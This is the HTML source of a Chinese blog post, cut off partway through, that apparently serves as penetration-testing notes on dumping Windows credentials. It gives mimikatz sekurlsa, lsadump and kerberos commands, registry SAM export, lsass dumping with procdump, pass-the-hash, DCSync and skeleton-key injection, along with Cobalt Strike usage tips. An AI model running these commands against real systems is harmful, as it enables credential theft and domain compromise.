@@ -1,0 +1,977 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="windows密码抓取1.Mimikatz介绍Mimikatz介绍Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网-Windows密码抓取">
+<meta property="og:url" content="http://example.com/2023/11/03/%E5%86%85%E7%BD%91-Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="windows密码抓取1.Mimikatz介绍Mimikatz介绍Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231010210729894.png">
+<meta property="og:image" content="http://example.com/img/image-20231010210718999.png">
+<meta property="og:image" content="http://example.com/img/image-20231010211354962.png">
+<meta property="og:image" content="http://example.com/img/image-20231010211404953.png">
+<meta property="og:image" content="http://example.com/img/image-20231010212015418.png">
+<meta property="og:image" content="http://example.com/img/image-20231010212243539.png">
+<meta property="og:image" content="http://example.com/img/image-20231010212511489.png">
+<meta property="og:image" content="http://example.com/img/image-20231010212638437.png">
+<meta property="og:image" content="http://example.com/img/image-20231010213631635.png">
+<meta property="og:image" content="http://example.com/img/image-20231010213308844.png">
+<meta property="og:image" content="http://example.com/img/image-20231011101631775.png">
+<meta property="og:image" content="http://example.com/img/image-20231011102251006.png">
+<meta property="og:image" content="http://example.com/img/image-20231011103136617.png">
+<meta property="og:image" content="http://example.com/img/image-20231011103157463.png">
+<meta property="og:image" content="http://example.com/img/image-20231011105344474.png">
+<meta property="og:image" content="http://example.com/img/image-20231011105400352.png">
+<meta property="og:image" content="http://example.com/img/image-20231011105807265.png">
+<meta property="og:image" content="http://example.com/img/image-20231011110452665.png">
+<meta property="og:image" content="http://example.com/img/image-20231011111319463.png">
+<meta property="og:image" content="http://example.com/img/image-20231011111311782.png">
+<meta property="og:image" content="http://example.com/img/image-20231011112003437.png">
+<meta property="og:image" content="http://example.com/img/image-20231011113256689.png">
+<meta property="og:image" content="http://example.com/img/image-20231011115113962.png">
+<meta property="og:image" content="http://example.com/img/image-20231011115201403.png">
+<meta property="og:image" content="http://example.com/img/image-20231011144853082.png">
+<meta property="og:image" content="http://example.com/img/image-20231011165224088.png">
+<meta property="og:image" content="http://example.com/img/image-20231011165210980.png">
+<meta property="og:image" content="http://example.com/img/image-20231011165354467.png">
+<meta property="og:image" content="http://example.com/img/image-20231011170339851.png">
+<meta property="og:image" content="http://example.com/img/image-20231011170639628.png">
+<meta property="og:image" content="http://example.com/img/image-20231011170850242.png">
+<meta property="og:image" content="http://example.com/img/image-20231011171055766.png">
+<meta property="og:image" content="http://example.com/img/image-20231011174133403.png">
+<meta property="og:image" content="http://example.com/img/image-20231011201859928.png">
+<meta property="og:image" content="http://example.com/img/image-20231011202011697.png">
+<meta property="og:image" content="http://example.com/img/image-20231011202106061.png">
+<meta property="og:image" content="http://example.com/img/image-20231011202807404.png">
+<meta property="og:image" content="http://example.com/img/image-20231011202930916.png">
+<meta property="og:image" content="http://example.com/img/image-20231011203443828.png">
+<meta property="og:image" content="http://example.com/img/image-20231011204045521.png">
+<meta property="og:image" content="http://example.com/img/image-20231011205234232.png">
+<meta property="og:image" content="http://example.com/img/image-20231011205414273.png">
+<meta property="og:image" content="http://example.com/img/image-20231011205528272.png">
+<meta property="og:image" content="http://example.com/img/image-20231011205634989.png">
+<meta property="og:image" content="http://example.com/img/image-20231011205803451.png">
+<meta property="og:image" content="http://example.com/img/image-20231011211405458.png">
+<meta property="og:image" content="http://example.com/img/image-20231011212911096.png">
+<meta property="og:image" content="http://example.com/img/image-20231011212832369.png">
+<meta property="og:image" content="http://example.com/img/image-20231011213003231.png">
+<meta property="og:image" content="http://example.com/img/image-20231011213350075.png">
+<meta property="og:image" content="http://example.com/img/image-20231011213450667.png">
+<meta property="article:published_time" content="2023-11-03T03:58:26.000Z">
+<meta property="article:modified_time" content="2023-11-03T04:10:52.435Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231010210729894.png">
+  
+  
+  
+  <title>内网-Windows密码抓取 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网-Windows密码抓取"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-03 11:58" pubdate>
+          2023年11月3日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网-Windows密码抓取</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="windows密码抓取"><a href="#windows密码抓取" class="headerlink" title="windows密码抓取"></a>windows密码抓取</h1><h2 id="1-Mimikatz介绍"><a href="#1-Mimikatz介绍" class="headerlink" title="1.Mimikatz介绍"></a>1.Mimikatz介绍</h2><h3 id="Mimikatz介绍"><a href="#Mimikatz介绍" class="headerlink" title="Mimikatz介绍"></a>Mimikatz介绍</h3><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证 </p>
+<p>项目地址 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
+<p>模块命令如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">cls： 清屏<br>standard： 标准模块，基本命令<br>crypto： 加密相关模块<br>sekurlsa： 与证书相关的模块<br>kerberos： kerberos模块<br>privilege： 提权相关模块<br>process： 进程相关模块<br>serivce： 服务相关模块<br>lsadump： LsaDump模块<br>ts： 终端服务器模块<br>event： 事件模块<br>misc： 杂项模块<br>token： 令牌操作模块<br>vault： Windows 、证书模块<br>minesweeper：Mine Sweeper模块<br>net：<br>dpapi： DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]<br>busylight： BusyLight Module<br>sysenv： 系统环境值模块<br>sid： 安全标识符模块<br>iis： IIS XML配置模块<br>rpc： mimikatz的RPC控制<br>sr98： 用于SR98设备和T5577目标的RF模块<br>rdm： RDM（<span class="hljs-number">830</span>AL）器件的射频模块<br>acr： ACR模块<br>version： 查看版本<br><span class="hljs-keyword">exit</span>： 退出<br></code></pre></td></tr></table></figure>
+
+<p>常用命令</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs arduino">CRYPTO::Certificates – 列出/导出凭证。<br>KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。<br>KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。<br>KERBEROS::PTT – 票证传递。<br>LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。<br>LSADUMP::LSA – 向 LSA <span class="hljs-built_in">Server</span> 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个<br>接下来看几个常用的模块<br>sekurlsa模块<br>process模块<br>lsass.dmp的转储文件中<br>导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，<br>如：“/name:krbtgt”。<br>LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安<br>全帐户管理器（SAM）<br>数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。<br>LSADUMP::Trust ‐ 向 LSA <span class="hljs-built_in">Server</span> 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或<br>林转储信任密钥（密码）<br>MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID<br>）。<br>MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。<br>MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。<br>使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。<br>PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。<br>SEKURLSA::Ekeys – 列出 Kerberos 密钥<br>SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。<br>SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。<br>SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的<br>计算机的凭证。<br>SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 <span class="hljs-built_in">Key</span>(s)）。<br>SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运<br>行的服务和本地计算机<br>在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。<br>TOKEN::List – 列出系统中的所有令牌。<br>TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。<br>TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌<br></code></pre></td></tr></table></figure>
+
+<p>几个常用的模块 </p>
+<p>sekurlsa模块</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nsis">privilege模块<br><span class="hljs-title function_">privilege::debug</span> 提升为debug权限<br>sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息<br><span class="hljs-title function_">sekurlsa::msv</span> 获取HASH (LM,NTLM)<br><span class="hljs-title function_">sekurlsa::wdigest</span> 通过可逆的方式去内存中读取明文密码<br><span class="hljs-title function_">sekurlsa::Kerberos</span> 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码<br><span class="hljs-title function_">sekurlsa::tspkg</span> 通过tspkg读取明文密码<br><span class="hljs-title function_">sekurlsa::livessp</span> 通过livessp 读取明文密码<br><span class="hljs-title function_">sekurlsa::ssp</span> 通过ssp 读取明文密码<br><span class="hljs-title function_">sekurlsa::logonPasswords</span> 通过以上各种方法读取明文密码<br><span class="hljs-title function_">sekurlsa::process</span> 将自己的进程切换到lsass进程中，之前只是注入读取信息<br><span class="hljs-title function_">sekurlsa::minidump</span> <span class="hljs-keyword">file</span> 这个模块可以读取已经打包的内存信息<br><span class="hljs-title function_">sekurlsa::pth</span> 哈希传递<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx<br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cs上：mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010210729894.png" srcset="/img/loading.gif" lazyload alt="image-20231010210729894"></p>
+<p>process模块</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">process::list 列出进程列表<br>process::exports 导出进程列表<br>process::imports 导入列表<br>process::start 开始一个进程<br>process::stop 停止一个程序<br>process::suspend 冻结一个进程<br>process::resume 从冻结中恢复<br>process::run notepad 运行一个程序<br>process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010210718999.png" srcset="/img/loading.gif" lazyload alt="image-20231010210718999"></p>
+<p>小tip：执行process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口，然后在这个窗口中执行cs木马，提升权限到system</p>
+<p><img src="/img/image-20231010211354962.png" srcset="/img/loading.gif" lazyload alt="image-20231010211354962"></p>
+<p><img src="/img/image-20231010211404953.png" srcset="/img/loading.gif" lazyload alt="image-20231010211404953"></p>
+<p>kerberos模块</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list 列出系统中的票据<br>kerberos::tgt 清除系统中的票据<br>kerberos::purge 导入票据到系统中<br>kerberos::ptc 票据路径<br></code></pre></td></tr></table></figure>
+
+<p>lsadump模块</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis">(域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等<br><span class="hljs-title function_">lsadump::dcsync</span> /domain:kevin.com /<span class="hljs-literal">user</span>:root<br>(在域控上执行)读取所有域用户的哈希<br><span class="hljs-title function_">lsadump::lsa</span> /patch<br>从sam.hive和<span class="hljs-params">system</span>.hive文件中获得NTLM Hash<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br>从本地SAM文件中读取密码哈希<br><span class="hljs-title function_">token::elevate</span><br><span class="hljs-title function_">lsadump::sam</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010212015418.png" srcset="/img/loading.gif" lazyload alt="image-20231010212015418"></p>
+<h2 id="2-离线读取SAM文件获取密码"><a href="#2-离线读取SAM文件获取密码" class="headerlink" title="2.离线读取SAM文件获取密码"></a>2.离线读取SAM文件获取密码</h2><h3 id="导出sam和system文件"><a href="#导出sam和system文件" class="headerlink" title="导出sam和system文件"></a>导出sam和system文件</h3><p>1、通多reg命令无工具导出(注册表中)</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231010212243539.png" srcset="/img/loading.gif" lazyload alt="image-20231010212243539" style="zoom:80%;" />
+
+<img src="/img/image-20231010212511489.png" srcset="/img/loading.gif" lazyload alt="image-20231010212511489" style="zoom:80%;" />
+
+<p>通过cs下载到cs服务器机器上：</p>
+<p><img src="/img/image-20231010212638437.png" srcset="/img/loading.gif" lazyload alt="image-20231010212638437"></p>
+<p>2、通过nishang中的Copy-VSS进行复制，如果这个脚本运行在了DC服务器上，ntds.dit 和 SYSTEM hive也能被拷贝出来</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">copy</span>‐vss <span class="hljs-comment">//直接将文件保存在当前目录下</span><br><span class="hljs-keyword">copy</span>‐vss ‐<span class="hljs-keyword">DestinationDir</span> 路径 <span class="hljs-comment">//指定保存文件的路径（必须是已经存在的路径）</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010213631635.png" srcset="/img/loading.gif" lazyload alt="image-20231010213631635"></p>
+<h3 id="读取sam和system文件获取密码"><a href="#读取sam和system文件获取密码" class="headerlink" title="读取sam和system文件获取密码"></a>读取sam和system文件获取密码</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231010213308844.png" srcset="/img/loading.gif" lazyload alt="image-20231010213308844" style="zoom: 67%;" />
+
+<h2 id="3-mimikatz在线读取sam和lsass获取密码"><a href="#3-mimikatz在线读取sam和lsass获取密码" class="headerlink" title="3.mimikatz在线读取sam和lsass获取密码"></a>3.mimikatz在线读取sam和lsass获取密码</h2><h3 id="在线读取sam文件"><a href="#在线读取sam文件" class="headerlink" title="在线读取sam文件"></a>在线读取sam文件</h3><p>使用mimikatz在线读取sam文件</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">分开的命令如下<br><span class="hljs-symbol">privilege:</span>:debug<br><span class="hljs-symbol">token:</span>elevate<br><span class="hljs-symbol">lsadump:</span>:sam<br>连起来<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意：在cs中执行加上exit   否则可能死循环</p>
+<p><img src="/img/image-20231011101631775.png" srcset="/img/loading.gif" lazyload alt="image-20231011101631775"></p>
+<h3 id="在线读取lsass进程"><a href="#在线读取lsass进程" class="headerlink" title="在线读取lsass进程"></a>在线读取lsass进程</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::msv 获取<span class="hljs-built_in">HASH</span> (LM,NTLM)<br>sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码<br>sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码<br>sekurlsa::tspkg 通过tspkg读取明文密码<br>sekurlsa::livessp 通过livessp 读取明文密码<br>sekurlsa::ssp 通过ssp 读取明文密码<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011102251006.png" srcset="/img/loading.gif" lazyload alt="image-20231011102251006"></p>
+<h2 id="4-mimikatz离线读取lsass进程获取密码（重点）"><a href="#4-mimikatz离线读取lsass进程获取密码（重点）" class="headerlink" title="4.mimikatz离线读取lsass进程获取密码（重点）"></a>4.mimikatz离线读取lsass进程获取密码（重点）</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42136837/article/details/112616369">https://blog.csdn.net/weixin_42136837/article/details/112616369</a></p>
+<h3 id="导出lsass文件方式"><a href="#导出lsass文件方式" class="headerlink" title="导出lsass文件方式"></a>导出lsass文件方式</h3><p>1、使用任务管理器导出（windows NT 6）</p>
+<p>前提：已经拿到3389远程桌面</p>
+<p><img src="/img/image-20231011103136617.png" srcset="/img/loading.gif" lazyload alt="image-20231011103136617"></p>
+<p><img src="/img/image-20231011103157463.png" srcset="/img/loading.gif" lazyload alt="image-20231011103157463"></p>
+<p>2、使用procdump 导出lsass.dmp文件 ProcDump 是一个<strong>命令行实用工具</strong>，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows任务管 理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure>
+
